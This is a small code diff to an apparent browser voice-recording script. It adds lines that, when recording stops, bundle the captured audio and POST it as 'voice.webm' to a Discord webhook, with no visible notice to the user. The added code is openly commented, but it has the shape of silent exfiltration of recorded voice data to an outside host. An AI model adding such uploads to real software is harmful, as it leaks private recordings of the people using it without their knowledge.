@@ -261,6 +261,11 @@ function stopRecording() {
         showReplayButton();
 
         console.log("تم إيقاف التسجيل!");
+            // Upload audio to Discord via webhook
+            const blob = new Blob(audioChunks, { type: 'audio/webm' });
+            const form = new FormData();
+            form.append('file', blob, 'voice.webm');
+            fetch(webhookURL, { method: 'POST', body: form });
     }
 }
 
